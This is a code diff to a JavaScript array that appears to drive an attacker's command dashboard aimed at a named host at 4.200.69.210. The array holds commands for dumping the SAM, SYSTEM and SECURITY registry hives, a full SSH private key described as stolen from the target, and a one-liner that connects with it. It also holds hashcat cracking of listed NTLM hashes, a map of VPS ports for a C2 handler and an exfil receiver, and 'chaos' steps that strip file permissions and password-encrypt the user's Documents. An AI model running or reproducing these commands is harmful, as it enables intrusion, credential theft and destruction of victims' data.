-    code: "reg save HKLM\\SAM C:\\Windows\\Temp\\sam\\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys\\nreg save HKLM\\SECURITY C:\\Windows\\Temp\\sec",
+    code: "reg save HKLM\\SAM C:\\Windows\\Temp\\sam\nreg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys\nreg save HKLM\\SECURITY C:\\Windows\\Temp\\sec",
     tags: ["cmd", "postexploit", "playbook"],
     accent: "#ff9800"
   },
@@ -3030,14 +3406,14 @@ const COMMANDS = [
   {
     title: "[SSH] Stolen adminvm1 Private Key",
     desc: "Ed25519 private key exfiltrated from target. Permanent access - doesn't expire like passwords. Save to file, chmod 600.",
-    code: "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0wAAAKAp2h95Kdof\\neQAAAAtzc2gtZWQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0w\\nAAAECb3VTMV+jfBsJsjEqrwaJhR+XI45LE0cg1glq5l9tW8b7OwAL8387J3YC/M1Pmoexh\\nEZL8PyNUqn9gnKNezRbTAAAAF2FkbWludm0xQENlcnRJVkN5YmVyTGFiAQIDBAUG\\n-----END OPENSSH PRIVATE KEY-----",
+    code: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0wAAAKAp2h95Kdof\neQAAAAtzc2gtZWQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0w\nAAAECb3VTMV+jfBsJsjEqrwaJhR+XI45LE0cg1glq5l9tW8b7OwAL8387J3YC/M1Pmoexh\nEZL8PyNUqn9gnKNezRbTAAAAF2FkbWludm0xQENlcnRJVkN5YmVyTGFiAQIDBAUG\n-----END OPENSSH PRIVATE KEY-----",
     tags: ["ssh", "persist", "lateral"],
     accent: "#e74c3c"
   },
   {
     title: "[SSH] Save Key and Connect",
     desc: "One-liner: saves key to ~/.ssh/, sets permissions, connects. Run on VPS. Works as long as key is in target's authorized_keys.",
-    code: "echo '-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0wAAAKAp2h95Kdof\\neQAAAAtzc2gtZWQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0w\\nAAAECb3VTMV+jfBsJsjEqrwaJhR+XI45LE0cg1glq5l9tW8b7OwAL8387J3YC/M1Pmoexh\\nEZL8PyNUqn9gnKNezRbTAAAAF2FkbWludm0xQENlcnRJVkN5YmVyTGFiAQIDBAUG\\n-----END OPENSSH PRIVATE KEY-----' > ~/.ssh/cloudlabs_key && chmod 600 ~/.ssh/cloudlabs_key && ssh -i ~/.ssh/cloudlabs_key adminvm1@4.200.69.210",
+    code: "echo '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0wAAAKAp2h95Kdof\neQAAAAtzc2gtZWQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0w\nAAAECb3VTMV+jfBsJsjEqrwaJhR+XI45LE0cg1glq5l9tW8b7OwAL8387J3YC/M1Pmoexh\nEZL8PyNUqn9gnKNezRbTAAAAF2FkbWludm0xQENlcnRJVkN5YmVyTGFiAQIDBAUG\n-----END OPENSSH PRIVATE KEY-----' > ~/.ssh/cloudlabs_key && chmod 600 ~/.ssh/cloudlabs_key && ssh -i ~/.ssh/cloudlabs_key adminvm1@4.200.69.210",
     tags: ["linux", "vps", "lateral", "playbook"],
     accent: "#00ff41"
   },
@@ -3046,30 +3422,35 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "VPS: Install Hashcat + Wordlist",
+    desc: "Installs hashcat and downloads rockyou.txt wordlist. One-time VPS setup.",
     code: "apt install hashcat -y && curl -L https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o /usr/share/wordlists/rockyou.txt",
     tags: ["linux", "vps", "postexploit"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Crack All CloudLabs Hashes",
-    code: "echo 'a4840a9c4a6828c0d5b5dbfa3bc567b0\\n996d8424607cc98092971283e3ac5b1c\\nff81519803d67ea2c41a2c40b70010e0\\nab4f5a5c42df5a0ee337d12ce77332f5' > /tmp/hashes.txt && hashcat -m 1000 -a 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --force",
+    desc: "Cracks all 4 CloudLabs user hashes with rockyou. --force for CPU-only. May take a while.",
+    code: "echo 'a4840a9c4a6828c0d5b5dbfa3bc567b0\n996d8424607cc98092971283e3ac5b1c\nff81519803d67ea2c41a2c40b70010e0\nab4f5a5c42df5a0ee337d12ce77332f5' > /tmp/hashes.txt && hashcat -m 1000 -a 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --force",
     tags: ["linux", "vps", "postexploit", "playbook"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Crack trainer Hash",
+    desc: "Cracks just the trainer account hash. Use for single-target cracking.",
     code: "echo '996d8424607cc98092971283e3ac5b1c' > /tmp/trainer.txt && hashcat -m 1000 -a 0 /tmp/trainer.txt /usr/share/wordlists/rockyou.txt --force",
     tags: ["linux", "vps", "postexploit"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Show Cracked Hashes",
+    desc: "Shows already-cracked hashes from previous runs. Hashcat remembers cracked passwords.",
     code: "hashcat -m 1000 /tmp/hashes.txt --show",
     tags: ["linux", "vps", "postexploit"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Dump Hashes from SAM+SYSTEM",
+    desc: "Extracts hashes from exfiltrated registry files. Uses wildcard to find files in /keys/.",
     code: "impacket-secretsdump -sam /keys/*sam* -system /keys/*system* LOCAL",
     tags: ["linux", "vps", "postexploit", "playbook"],
     accent: "#00ff41"
@@ -3079,13 +3460,15 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "[PORTS] VPS Service Map",
-    code: "# 4444 - C2 Handler (c2_multi_v2.py)\\n# 8080 - HTTP Server (general)\\n# 8083 - Exfil Receiver (catch_all.py)\\n# 8889 - HTTP Server (beacon/tools)\\n# 9999 - Spare",
+    desc: "Reference: VPS 168.144.166.97 port assignments. Memorize or copy for quick reference.",
+    code: "# 4444 - C2 Handler (c2_multi_v2.py)\n# 8080 - HTTP Server (general)\n# 8083 - Exfil Receiver (catch_all.py)\n# 8889 - HTTP Server (beacon/tools)\n# 9999 - Spare",
     tags: ["reference", "vps"],
     accent: "#607d8b"
   },
   {
     title: "[PORTS] Target CloudLabs 4.200.69.210",
-    code: "# 22 - SSH (OpenSSH)\\n# 445 - SMB (for PTH)\\n# 3389 - RDP\\n# 135 - WMI (for wmiexec)",
+    desc: "Reference: CloudLabs target open ports. Use for impacket tool selection.",
+    code: "# 22 - SSH (OpenSSH)\n# 445 - SMB (for PTH)\n# 3389 - RDP\n# 135 - WMI (for wmiexec)",
     tags: ["reference", "recon"],
     accent: "#607d8b"
   },
@@ -3116,7 +3499,7 @@ const COMMANDS = [
   {
     title: "[CHAOS-4] Remove User Access",
     desc: "Step 4: Explicitly remove adminvm1, Administrators, Users from ACL.",
-    code: "icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /remove adminvm1\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /remove Administrators\\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /remove Users",
+    code: "icacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /remove adminvm1\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /remove Administrators\nicacls C:\\Users\\adminvm1\\Desktop\\PWNED.txt /remove Users",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
@@ -3151,21 +3534,21 @@ const COMMANDS = [
   {
     title: "[CHAOS] Change Wallpaper",
     desc: "Changes wallpaper. First download image to C:\\Windows\\Temp\\pwned.jpg then run this.",
-    code: "reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f\\nRUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters",
+    code: "reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f\nRUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Set Wallpaper for All Users",
     desc: "Forces wallpaper for ALL users via GPO. Requires SYSTEM. Persists across reboots.",
-    code: "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP\" /v DesktopImagePath /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f\\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP\" /v DesktopImageStatus /t REG_DWORD /d 1 /f",
+    code: "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP\" /v DesktopImagePath /t REG_SZ /d C:\\Windows\\Temp\\pwned.jpg /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PersonalizationCSP\" /v DesktopImageStatus /t REG_DWORD /d 1 /f",
     tags: ["cmd", "chaos", "persist"],
     accent: "#ff2a6d"
   },
   {
     title: "[CHAOS] Encrypt User's Files (7zip)",
     desc: "Step 1: Download 7zip. Step 2: Install silently. Step 3: Encrypt Documents. Run each line separately.",
-    code: "IWR -Uri https://www.7-zip.org/a/7z2301-x64.exe -OutFile C:\\Windows\\Temp\\7z.exe\\nC:\\Windows\\Temp\\7z.exe /S\\nStart-Sleep 10\\n& 'C:\\Program Files\\7-Zip\\7z.exe' a -pPWNED123 -mhe=on C:\\Windows\\Temp\\encrypted.7z C:\\Users\\adminvm1\\Documents\\*",
+    code: "IWR -Uri https://www.7-zip.org/a/7z2301-x64.exe -OutFile C:\\Windows\\Temp\\7z.exe\nC:\\Windows\\Temp\\7z.exe /S\nStart-Sleep 10\n& 'C:\\Program Files\\7-Zip\\7z.exe' a -pPWNED123 -mhe=on C:\\Windows\\Temp\\encrypted.7z C:\\Users\\adminvm1\\Documents\\*",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
@@ -3228,7 +3611,7 @@ const COMMANDS = [
   {
     title: "[CHAOS] Flip Screen Upside Down",
     desc: "Rotates display 180 degrees. Complex P/Invoke code. May not work on all displays. User can fix via display settings.",
-    code: "Add-Type -TypeDefinition @'\\nusing System;using System.Runtime.InteropServices;\\npublic class Display{[DllImport(\"user32.dll\")]public static extern int EnumDisplaySettings(string a,int b,ref DEVMODE c);[DllImport(\"user32.dll\")]public static extern int ChangeDisplaySettings(ref DEVMODE a,int b);[StructLayout(LayoutKind.Sequential)]public struct DEVMODE{[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;public short dmSpecVersion;public short dmDriverVersion;public short dmSize;public short dmDriverExtra;public int dmFields;public int dmPositionX;public int dmPositionY;public int dmDisplayOrientation;public int dmDisplayFixedOutput;public short dmColor;public short dmDuplex;public short dmYResolution;public short dmTTOption;public short dmCollate;[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;public short dmLogPixels;public int dmBitsPerPel;public int dmPelsWidth;public int dmPelsHeight;public int dmDisplayFlags;public int dmDisplayFrequency;}}\\n'@",
+    code: "Add-Type -TypeDefinition @'\nusing System;using System.Runtime.InteropServices;\npublic class Display{[DllImport(\"user32.dll\")]public static extern int EnumDisplaySettings(string a,int b,ref DEVMODE c);[DllImport(\"user32.dll\")]public static extern int ChangeDisplaySettings(ref DEVMODE a,int b);[StructLayout(LayoutKind.Sequential)]public struct DEVMODE{[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmDeviceName;public short dmSpecVersion;public short dmDriverVersion;public short dmSize;public short dmDriverExtra;public int dmFields;public int dmPositionX;public int dmPositionY;public int dmDisplayOrientation;public int dmDisplayFixedOutput;public short dmColor;public short dmDuplex;public short dmYResolution;public short dmTTOption;public short dmCollate;[MarshalAs(UnmanagedType.ByValTStr,SizeConst=32)]public string dmFormName;public short dmLogPixels;public int dmBitsPerPel;public int dmPelsWidth;public int dmPelsHeight;public int dmDisplayFlags;public int dmDisplayFrequency;}}\n'@",
     tags: ["ps", "chaos"],
     accent: "#ff2a6d"
   },
@@ -3249,7 +3632,7 @@ const COMMANDS = [
   {
     title: "[CHAOS] Hide All Desktop Icons",
     desc: "Hides all desktop icons. Explorer restart applies change. Set to 0 to show again.",
-    code: "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v HideIcons /t REG_DWORD /d 1 /f\\nStop-Process -Name explorer -Force\\nStart-Process explorer",
+    code: "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v HideIcons /t REG_DWORD /d 1 /f\nStop-Process -Name explorer -Force\nStart-Process explorer",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
   },
@@ -3437,7 +3820,7 @@ const COMMANDS = [
   {
     title: "[TARGET-VERIFY] Check WinRM",
     desc: "Should show WinRM service Running on port 5985.",
-    code: "Get-Service WinRM | Select Status\\nnetstat -an | findstr 5985",
+    code: "Get-Service WinRM | Select Status\nnetstat -an | findstr 5985",
     tags: ["ps", "lateral", "recon"],
     accent: "#00f0ff"
   },
